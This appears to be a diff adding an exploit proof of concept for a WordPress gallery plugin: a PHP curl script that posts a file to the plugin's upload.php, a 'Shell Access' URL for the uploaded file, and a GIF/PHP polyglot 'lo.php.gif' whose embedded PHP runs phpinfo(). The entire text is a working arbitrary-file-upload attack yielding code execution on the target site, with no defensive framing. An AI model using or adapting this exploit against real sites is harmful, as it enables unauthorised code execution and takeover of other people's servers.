@@ -1,0 +1,25 @@
+PostShell.php
+<?php
+
+$uploadfile="lo.php.gif";
+$ch =
+curl_init("http://www.exemple.com/wordpress/wp-content/plugins/picturesurf-gallery/upload.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+array('Filedata'=>"@$uploadfile",
+'is_simple'=>'is_simple'));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
+
+Shell Access :
+http://www.exemple.com/wordpress/wp-content/plugins/picturesurf-gallery/data/upload/lo.php.gif
+
+lo.php.gif
+GIF89a???????????!??????,???????D?;?
+<?php
+phpinfo();
+?>
